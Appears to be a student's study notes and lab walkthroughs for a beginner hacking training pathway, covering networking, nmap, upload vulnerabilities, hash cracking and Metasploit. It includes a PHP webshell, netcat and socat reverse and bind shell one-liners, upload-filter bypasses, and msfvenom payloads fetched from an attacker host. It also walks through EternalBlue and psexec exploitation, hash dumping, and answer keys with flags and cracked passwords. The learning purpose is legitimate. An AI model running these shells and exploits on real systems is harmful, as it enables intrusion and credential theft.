These are my notes, answers, and writeups for all the rooms in the Complete Beginner Pathway.

Complete Beginner Introduction
- [Starting Out In CyberSec](#starting-out-in-cybersec)
- [Introductory Researching](#introductory-researching)

Linux Foundamentals
- [Linux Foundamentals Part 1](#linux-foundamentals-part-1)
- [Linux Foundamentals Part 2](#linux-foundamentals-part-2)
- [Linux Foundamentals Part 3](#linux-foundamentals-part-3)

Network Exploitation Basics
- [Introductory Networking](#introductory-networking)
  - [Encapsulation](#encapsulation)
  - [The TCP/IP Model](#the-tcpip-model)
  - [Networking Tools](#networking-tools)
- [Nmap](#nmap)
  - [Ports](#ports)
  - [Scan Types](#scan-types)
- [Network Services](#network-services)
  - [Server Message Block](#server-message-block)
  - [Telnet](#telnet)
  - [File Transfer Protocol](#file-transfer-protocol)
  - [Network File System](#network-file-system)

Web Hacking Fundamentals
- [Upload Vulnerabilities](#upload-vulnerabilities)
  - [Overwriting Existing Files](#overwriting-existing-files)
  - [Remote Code Execution](#remote-code-execution)
  - [Filtering](#filtering)
  - [Bypassing Client Side Filtering](#bypassing-client-side-filtering)
  - [Bypassing Server Side Filtering](#bypassing-server-side-filtering)
  - [Example Methodology](#example-methodology)
  - [Challenge](#challenge)
- [Pickle Rick](/tryhackme/ctfs/pickle_rick.md)

Cryptography
  - [Hashing - Crypto 101](#hashing---crypto-101)
  - [John The Ripper](#john-the-ripper)

Windows Exploitation Basics
- [Metasploit: Introduction](#metasploit-introduction)
- [Metasploit: Exploitation](#metasploit-exploitation)
- [Metasploit: Meterpreter](#metasploit-meterpreter)
- [Blue](/tryhackme/ctfs/blue.md)

Shells and Privilege Escalation
  - [What the Shell](#what-the-shell)
    - [Netcat Shell Stablization](#netcat-shell-stablization)
    - [Reverse Shell](#reverse-shell)
    - [Bind Shell](#bind-shell)
  - [Privilege Escalation](#privilege-escalation)

Basic Computer Exploitation
- [Vulnversity](/tryhackme/ctfs/vulnversity.md)
- [Basic Pentesting](/tryhackme/ctfs/basic_pentesting.md)
- [Kenobi](/tryhackme/ctfs/kenobi.md)
- [Steel Mountain](/tryhackme/ctfs/steel_mountain.md)

## Starting Out In CyberSec
- **Offensive Security**
  - involves attacking applications and technologies to discover vulnerabilites
  - most common job is penetration tester
    - person legally employed by organization to find vulns in their products
- **Defensive Security**
  - involves detecting and stopping attacks
  - security analyst
    - monitors systems and detects when they're being attacked
  - incident responder
    - brought in when attack has already happened
    - responsible for understanding the attack and its impacts
  - malware analysis

## Introductory Researching
- the ability to ***research efficiently*** is the most important quality for a hacker to have
- hacking requires a *vast* knowledge base
- helpful resouces for specific software exploits:
  - [Exploit-DB](https://www.exploit-db.com/) - contains exploits
  - [NVD](https://nvd.nist.gov/vuln/search) - keeps track of CVEs
  - `searchsploit` - CLI version of Exploit-DB
  - `man`

## Linux Foundamentals Part 1
- **Linux OS** is one of the most popular in the world 
- powers smart cars, android devices, supercomputers, home appliances, enterprise servers, and more
- umbrella term for multiple OS's that are based on **UNIX**
- `find -name <file> <dir>` - recursively look for `<file>` in `<dir>`
- `&` - run commands in background

## Linux Foundamentals Part 2
- Directories
  - `/etc` - store system files used by OS
    - system files are files essential for a computer system to function properly
    - ex: `shadow`, `passwd`
  - `/var` - stores data that is frequently accessed or written by services or applications running on the system 
    - ex: `log`, `opt`
  - `/root` - home for root user
  - `/tmp` - store data that is only needed to be accessed once or twice
    - any user can write to this folder by default

## Linux Foundamentals Part 3
- `scp <src> <dst>` - securely copy files
  - allows you to transfer files between two computers using the SSH protocol
- Processes are the programs running on the computer and are managed by the kernal.
- `ps aux` - also view processes run by other users and system processes
- `top` - real time statistics about processes
- You can send signals to `kill <PID>` a process
  - SIGTERM - allow cleanup
  - SIGKILL - no cleanup
  - SIGSTOP - stop a process
- The OS use **namespaces** to split computer resources to processes
  - namespaces isolate processes from one another
    - only those in the same namespace can see each other
- Process with PID 0 is started when system boots
- `systemd` is one of the first processes to start
  - manages user processes
  - sits between OS and user
  - any process we start will be a **children** of `systemd`
- `systemctl [option] [service]` allows us to interact with `systemd` process
  - there are 4 options: `start`, `stop`, `enable`, and `disable`
- Processes can run in the background or foreground
- the `cron` process allows us to schedule tasks
  - we interact with it through `crontabs`
    - a file with formatting recognised by `cron` to execute each line step-by-step
    - process started during boot

## Introductory Networking
- Real-world networking is based off TCP/IP model
- OSI (Open Systems Interconnection) Model
  - standardised model used to demonstrate theory behind networking
  ```
  7. Application 
      - provide interface for programs to transmit data
      - provide networking options for programs
  6. Presentation 
      - translate data into standardized format
      - handle encryptions, compressons, and other transformations
  5. Session
      - create and maintain a unique connection with remote computer 
  4. Transport
      - choose protocol (TCP, UDP, ...)
      - divide data into segments (TCP) or datagrams (UDP)
  3. Network
      - find fasetest route to IP address
  2. Data Link
      - add MAC address
      - check recieved data isn't corrupted
  1. Physical
      - translate binary data into signals and vice versa
      - send and recieve signals
  ```

### Encapsulation
- the **process** by which data is **sent** from one computer to another
- as data is passed down each layer, more information is added to the start
- in Data Link, information is appended to the end, too, for the recieving computer to verify that the data was not corrupted during transmission
- **de-encapsulation** - the reverse of encapsulation, done by recieving computer to read the data
- encapsulated data names: data, segments/datagrams, packets, frames, bits

### The TCP/IP Model
- basis for real world networking
- **Application**: application, presentation, session
- **Transport**: transport
- **Internet**: network
- **Network Interface**: data link, physical

### Networking Tools
- `ping <dst>` 
  - checks if a connection to a remote system is possible
  - uses ICMP protocol, which operates on Network layer
- `traceroute <dst>`
  - maps the route your request takes to the remote system
  - Windows `tracert` uses ICMP
  - Linux uses UDP
- `whois <domain>`
  - query who a domain name is registered to
- `dig <domain> @<dns-server-ip>`
  - query recursive DNS servers
- **Domain Name System (DNS)**
  - a TCP/IP protocol
  - Order is as follows:
    1. Local Host files
    2. Local DNS cache
    3. Recursive DNS server
    4. Root name server
        - Top-level domain servers (.com, .net, ...)
          - Authoritative name servers - source of information

## Nmap
- proper enumeration is extremely important
- **port scanning** - find what services are running on target system
- `nmap` connects to each port and determines if it's open, closed, or filtered
  - then it enumerates which services are running on each open port
### Ports
- when a computer runs a network service, it opens a port to recieve connections
- ports are necessary for making **multiple network requests** or having **multiple services running**
- network connections are made between two ports
- there are total of **65535** ports on each computer
### Scan Types
- `-sT` TCP
  - sends `syn`
  - OPEN: gets back `syn/ack`, sends `ack`
  - CLOSED: gets back `rst`
  - FILTERED: gets back nothing (protected by firewall)
- `-sS` SYN 
  - sends `syn`
  - OPEN: gets back `syn/ack`, sends `rst`
  - CLOSED: gets back `rst`
  - FILTERED: gets back nothing (protected by firewall)
- `-sU` UDP
  - OPEN: gets back nothing or `UDP` packet
  - CLOSED: gets back `ICMP` packet
  - FILTERED: gets back nothing
- `-sN` TCP NULL
  - sends TCP request with no flags
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sF` TCP FIN
  - sends TCP request with `FIN` flag
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sX` TCP Xmas
  - sends TCP request with `PSH, URG, FIN` flags
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sN` Ping Sweep
  - sends `ICMP` packet to each IP address for network
  - finds active hosts
  - sends `SYN` to port 443, `ACK` to port 80
- `-Pn` 
  - don't ping hosts before scanning
  - used to bypass firewalls which block ICMP packets

## Network Services
### Server Message Block 
- A client-server communication protocol used for sharing access to files, printers, and other resources on a network
  - the protocol is a response-request protocol, meaning you transmite multiple messages between client and server to establish a connection
- SMB share drives on a server can be connected to and used to view or transfer files
- `enum4linux -a <ip>` enumerate SMB shares
- `smbclient //<ip>/<share> -U <user> -p <port>` access resources on server
- The **exploit** is anonymous SMB share access
  - a common misconfiguration that can allow us to gain information that will lead to a shell

### Telnet
- An application protocols that allows you to connect to and execute commands on a remote machiine that's hosting a telnet server
- Telnet does not encrypt data
- `telnet <ip> <port>` to connect to a telnet server
- The **exploit** is the telnet server allows execution of system commands and connect back to our local server.

###  File Transfer Protocol
- A protocol that allows remote transfer of files over a network.
- uses a client-server model
  - client initiates a connection
  - server validates login credentials and opens a session
- FTP sessions operate using two channels: command and data
  - both channels are unencrypted
- supports an Active or Passive connection, or both
  - Active: client listens, server connects
- The **exploit** is anonymous FTP login which gives us a username and we use `hydra` to bruteforce the password.

### Network File System
- NFS allows a system to share directories and files with other systems over a network.
- Mounts all or a portion of a file system on a server
  - Mounting is a process by which a computer's operating system makes files and directories on a storage device available for users to access via the computer's file system.
- `showmount -e <ip>` list NFS shares
- `sudo mount -t nfs IP:share /tmp/mount/ -nolock` connect NFS share to mount point
- The exploit here is **root squash**, which prevents root access, is turned off.

## Upload Vulnerabilities
- An attacker with the ability to upload a file of their choice with no restrictions is very dangerous.
### Overwriting Existing Files
- When files are uploaded to a server, it must be checked that it doesn't overwrite any files already on the server.
  - assign new name to file
  - return an error if filename already exists
  - Permissions should be properly assigne; webpages should not be writable for a web user
### Remote Code Execution
- Upload a shell written in the same language as the back-end of the website and activate it by
  - navigating directly to it (non-routed)
  - forcing webapp to run it (routed)
- In a routed application, (routes are defined programmatically rather than being mapped to the file-system), this attack becomes more complicated and less likely to occur. 
  - Most modern web frameworks are routed programmatically.
- There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: webshells and reverse/bind shells.
- A simple PHP webshell works by taking a parameter and executing it as a system command.
  ```
  <?php
    echo system($_GET["cmd"]);
  ?>
  ```
- This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.
### Filtering
- Extension Validation
  - Blacklist - list of extensions not allowed, rest allowed
  - Whitelist - list of extensions allowed, rest not allowed
- File Type Filtering
  - verify contents of file are acceptable for upload
  - MIME validation (Multipurpose Internet Mail Extension)
    - the Content-Type value
  - Magic Number Validation
- File Length Filtering
- File Name Filtering
  - File names should be unique
    - random data could be added to file name
  - File is sanitised
    - remove problematic characters
  - Our uploaded file is unlikely to have the same name as before uploading
- These filters are usually used in conjunction with each other.
- These filters can be used both client-side and server-side.
### Bypassing Client-Side Filtering
- Turn off Javascript in browser
- Intercept and modify page
  - use Burpsuite to intercept and remove Javascript
- Intercept and modify file upload
  - use Burpsuite to change Content-Type and file extension
- Send file directly to upload point
  - Use `curl` 
### Bypassing Server-Side Filtering
- File extensions: 
  - use a variety of valid file extensions `.php`, `.phtml` `...`
  - use multiple file extension `.jpg.php`
- Magic numbers:
  - Change magic numbers with `hexeditor` to magic numbers of file type that are accepted
### Example Methodology
1. Find out what language and frameworks the website is built with.
    - look for headers `server` or `x-powered-by`
2. Look for vectors of attack
3. Look for filterings
4. Attempt innocent file upload and see how file is accessed
5. Attempt malicious file upload

### Challenge
1. Using Wappalyzer, we see that the framework is Express, so we know we need a Javascript shell.
2. Using `gobuster`, we see an `/admin` page which will be used to execute our uploaded shell. We also see a `/content` and `/module` page, which lead to nowhere as of right now.
3. The source code tells us there is an `/upload.js` client-side filtering. We can get remove this in Burpsuite to bypass the client-side filtering. 
4. While using Burpsuite, we see that there are `.jpg` files inside of the `/content` page, so this must be where the images are being uploaded to.
5. We attempt to upload our script, but it's blocked, so we know there is a server-side filtering. The server-side filtering has a whitelist for `.jpg` file extensions. Change the file extension of our shell program from `.js` to `.jpg`.
6. Upload the exploit and run `gobuster dir -x .jpg -u http://jewel.uploadvulns.thm/content -w <task_file>` to find all `.jpg` files in `/content` page.
7. Open a netcat listener and on `/admin`, try all files with `../content/<jpg>` until one is successful. If you were recording all the `.jpg` files in Burpsuite, one of new files is your exploit.

Hack the machine and grab the flag from /var/www/
```
cd /var/www
cat flag.txt
```
> THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}

## Hashing - Crypto 101
- Cryptanalysis : Attacking cryptography by finding a weakness in the underlying maths
- The salt is randomly generated and stored in the database, unique to each user.
  | Unix style password prefix  | Description 
  | -------                     | ----------- 
  | \$1$                      | md5crypt
  |  \$2$, \$2a$, \$2b$, \$2x$, \$2y$   | Bcrypt 
  | \$6$                  | sha512crypt 

## John the Ripper
- A hash cracking tool
- Use a hash-identifier `hash-id.py` to find the type of hash
- `john --format=[format] --wordlist=[path to wordlist] [path to file]`
- NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".
- `unshadow [path to passwd] [path to shadow]` crack /etc/shadow passwords
- In single crack mode, John uses the username to find possible passwords by slightly changing the username.
  - `john --single --format=[format] [path to file]`
  - prepend username to hash
- Custom rules can be defined in the `john.conf` file.
- `zip2john [options] [zip file] > [output file]`
- `rar2john [rar file] > [output file]`
- `ssh2john [id_rsa private key file] > [output file]`

## What the Shell?
- **Reverse shells** are when the target executes code that connects back to your computer.
- **Bind shells** are when you execute code that connects to the target computer.
- Interactive shells allow you to interact with programs after execution.
- Non-interactive shells do not and make up the majority of simple reverse and bind shells.
### Netcat Shell Stablization
1. `python3 -c 'import pty;pty.spawn("/bin/bash")`
2. `export TERM=xterm`
3. `stty raw -echo; fg`

### Reverse Shell
| Linux | Windows 
| ---------| -------
| A: `nc -lvnp <port>` | 
| T: `nc <local-ip> <port> -e /bin/bash` | `nc <local-ip> <port> -e "cmd.exe"`
| |
| A: `socat TCP-L:<port> -` |
| T: `socat TCP:<IP>:<port> EXEC: "bash -li"` | `socat TCP:<IP>:<port> EXEC: powershell.exe, pipes`
| |
| A: ``socat TCP-L:<port> FILE: `tty`, raw, echo=0``
| T: `socat TCP:<IP>:<port> EXEC "bash -li", pty,stderr,sigint,setsid,sane`

### Bind Shell
| Linux | Windows 
| ---------| -------
| T: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f \| /bin/sh >/tmp/f 2>&1; rm /tmp/f` | `nc -lnvp <port> -e "cmd.exe"`
| A: `nc <IP> <port>` 
||
| T: `socat TCP-L:<port> EXEC: "bash -li"` | `socat TCP-L:<port> EXEC: powershell.exe, pipes`
| A: `socat TCP:<IP>:<port> -`

## Privilege Escalation
- The exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
- LinEnum is a bash script that performs common commands related to privilege escalation.
1. Weak File Permissions
    - Readable `/etc/shadow`
    - Writable `/etc/shadow`, `/etc/passwd`
2. `sudo -l`
3. Cron Jobs
4. SUID / SGID Executables
5. Password and Keys

## Metasploit: Introduction
- **Metasploit** is a tool for pentesting, ranging from enumeration to post-exploitation.
- **Metasploit Framework** is the open-source version that works from the command line.
- Main Components
  - msfconsole - CLI
  - modules - scanners, payloads, exploits, etc.
  - tools - msfvenom
- Definitions
  - vulnerability - a flaw in the target system
  - exploits - code that uses a vulnerability
  - **?** payload - code that runs on target system
- Modules
  - auxiliary - supporting modules like scanners, crawlers
  - encoder - encode exploit and payload to bypass signature-based antivirus
  - evasion - evade antivirus software
  - exploits
  - NOP - does nothing 
  - payload
    - singles - don't need to download additional components to run
    - **?** adapters - wrap single payloads
    - stagers - set up connection between Metasploit and target system
    - stages - downloaded by stagers, allow for larger payloads
  - post - post-exploitation
- `_` for single (in-line) payload, `/` for staged payload
- **msfconsole** is context-based, meaning all module options settings (unless global) will be lost if the module is changed.
- `setg` is `set` for global variables, likewise `unsetg` for `unsetg`
- The exploitation process is 3 steps:
  1. Find the exploit
  1. Customize the exploit
  1. Exploit the vulnerable service
    
### Questions
#### Task 2
- What is the name of the code taking advantage of a flaw on the target system?
  > Exploit
- What is the name of the code that runs on the target system to achieve the attacker's goal?
  > Payload
- What are self-contained payloads called?
  > Singles
- Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
  > Singles
#### Task 3
- How would you search for a module related to Apache?
  > search apache
- Who provided the auxiliary/scanner/ssh/ssh_login module?
  ```
  info auxiliary/scanner/ssh/ssh_login
  ```
  > todb
#### Task 4
- How would you set the LPORT value to 6666?
  > set LPORT 6666
- How would you set the global value for RHOSTS to 10.10.19.23 ?
  > setg RHOSTS 10.10.19.23
- What command would you use to clear a set payload?
  > unset payload
- What command do you use to proceed with the exploitation phase?
  > exploit
  
## Metasploit: Exploitation
- `search portscan` - list port scanning modules
- `nmap` scans can be made in `msfconsole` prompt
- Metasploit is **NOT** fast.
- NETBIOS (Network Basic Input Output System) allows computers to communicate over the network to share files or send files to printers.
- The NetBIOS name of the target system can give you an idea about its role and importance.
- Real pentesting will likely have several targets.
  - Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
    - Start a PostgreSQL database
      ```
      systemctl start postgresq
      msfdb init
      msfconsole
      db_status
      ```
    - The database feature will allow you to create workspaces to isolate different projects.
    - `workspace` - list available workspaces, use `-h` for help
    -  `db_nmap` - runs `nmap`, saving result to database
    -  `hosts`, `services` - information relevant to hosts and services running on target systems
    -  Once the host information is stored in the database, you can use `hosts -R` to add this value to the RHOSTS parameter.
- Finding vulnerabilities using Metasploit rely heavily on your ability to scan and fingerprint the target.
- Choosing a working payload could become a trial and error process.
- `msfvenom` allows you to create payloads in many different formats for many different target systems.
- `msfvenom --list formats` - lists supported output formats
- `use exploit/multi/handler`
  - multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
  - used to recieve incoming connection from payload
    - set up handler accordingly with payload, lhost, lport of payload, same values
- **Meterpreter** is a powerful tool that offers a lot of easy to use features during the post-exploitation phase.
  
## Questions
### Task 2
- How many ports are open on the target system?
  ```
  nmap <target_ip>
  ```
  > 5
- Using the relevant scanner, what NetBIOS name can you see?
  ```
  use auxiliary/scanner/netbios/nbname
  set rhosts <target_ip>
  run
  ```
  > ACME IT SUPPORT
- What is running on port 8000?
  ```
  use auxiliary/scanner/http/http_version
  set rhosts <target_ip>
  set lport 8000
  run
  ```
  > webfs/1.21
- What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
  ```
  use auxiliary/scanner/smb/smb_login
  set rhosts <target_ip>
  set pass_file <pass_file>
  set smbuser penny
  run
  ```
  > leo1234
### Task 5
- Exploit one of the critical vulnerabilities on the target VM
  ```
  use exploit/windows/smb/ms17_010_eternalblue
  set payload windows/x64/meterpreter/reverse_tcp
  set rhosts <target_ip>
  run
  ```
- What is the content of the flag.txt file?
  ```
  shell
  cd ../..
  dir /b/s flag.txt
  type C:\Users\Jon\Documents\flag.txt
  ```
  > THM-5455554845
- What is the NTLM hash of the password of the user "pirate"?
  ```
  hashdump
  ```
  > 8ce9a3ebd1647fcc5e04025019f4b875
### Task 6
- Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
  ```
  ssh murphy@<target_ip> 
  ```
- Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).
  ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
  ```
- Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_10.10.190.253:9000/shell.elf to download it to the target machine).
  ```
  attack: python3 -m http.server
  target: wget http://<attack_ip>:8000/rev_shell.elf
  ```
- Get a meterpreter session on the target machine.
  ```
  attack: use exploit/multi/handler
          set payload linux/x86/meterpreter/reverse_tcp
          set lhost <attack_ip>
          set lport <port>
          run
  target: ./rev_shell.elf
  ```
- Use a post exploitation module to dump hashes of other users on the system.
  ```
  background
  use post/linux/gather/hashdump
  set session <num>
  run
  ```
  > $6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.

# Metasploit: Meterpreter
- **Meterpreter** is a Metasploit payload
  - runs on **target** system, but is not installed on it
    - runs in **RAM** and does not write itself to disk to avoid detection by antivirus
      - antivirus software scan new files on disk by default
    - seen as a **process**, not a file
  - uses **encrypted communication** to try to avoid IPS, IDS detection
  - **?** acts as an agent within a command and control architecture
- Most antivirus software will detect Meterpreter.
- **Staged** payloads are sent in two steps:
  1. An initial payload (stager) is sent.
  2. This stager requests the rest of the payload.
- **Inline** payloads are sent in a single step.
- Meterpreter payloads are also divided into staged and inline versions.
- `msfvenom --list payloads | grep meterpreter` - list available Meterpreter versions
- Three factors for deciding which Meterpreter version to use:
  - target OS
  - components available on target system (Is python installed? IS this a php website?)
  - network connection types available on target system
- running `help` is always a good idea
- Meterpreter provides three primary categories of tools;
  - Built-in commands
  - Meterpreter tools
  - Meterpreter scripting
- `getuid` - display the user with which Meterpreter is currently running, gives idea of possible privilege level on the target system
- `ps` - list running processes, give PID information for migration
- `migrate <PID>`
  - Migrating to another process will help Meterpreter interact with it
  - For example, if you see a word processor running on the target, you can migrate to it and start capturing keystrokes sent by the user to this process.
  - Migrating to another process may also help you to have a more stable Meterpreter session.
> [!CAUTION]
> You may lose your user privileges if you migrate from a higher privileged user to a process started by a lower privileged user.
- `hashdump` - dumps content of the SAM database
  - SAM (Security Account Manager) stores user passwords on Windows systems.
  - Passwords are store in NTLM (New Technology LAN Manager) format.
- `search -f` - locate files
- `shell` - launch regular command-line shell on target system
- `getsystem` - attempt to elevate your privilege to that of local system
- Goals of post-exploitation phase:
  - Gathering further information about the target system
  - Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system
  - Privilege escalation
  - Lateral movement
  
## Questions
### Task 5
You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
> Username: ballen
> Password: Password1
- What is the computer name?
  ```
  use exploit/windows/smb/psexec
  set rhosts <target_ip>
  set smbpass Password1
  set smbuser ballen
  run
  sysinfo
  ```
  > ACME-TEST
- What is the target domain?
  > FLASH
- What is the name of the share likely created by the user?
  ```
  use auxiliary/scanner/smb/smb_enumshares
  set rhosts <target_ip>
  set smbpass Password1
  set smbuser ballen
  run

  background
  use post/windows/gather/enum_shares
  set session <num>
  run
  ```
  > speedster
- What is the NTLM hash of the jchambers user?
  
  **?** Use `ps` to find PID of lsass.exe.
  ```
  migrate <PID>
  hashdump
  ```
  > 69596c7aa1e8daee17f8e78870e25a5c
- What is the cleartext password of the jchambers user?
  
  The third field contains the 'aad3b' string, so we use `--format=NT`. 
  ```
  echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt
  john --format=NT --wordlist=<rockyou.txt> hash.txt
  ```
  > Trustno1
- Where is the "secrets.txt"  file located? (Full path of the file)

  For some reason, `search -f secrets.txt` was taking super long, so I went another route.
  ```
  shell
  cd ../..
  dir /b/s secrets.txt
  ```
  > C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
- What is the Twitter password revealed in the "secrets.txt" file?
  ```
  cat C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
  ```
  > KDSvbsw3849!
- Where is the "realsecret.txt" file located? (Full path of the file)
  ```
  search -f realsecret.txt
  ```
  > c:\inetpub\wwwroot\realsecret.txt
- What is the real secret?
  > The Flash is the fastest man alive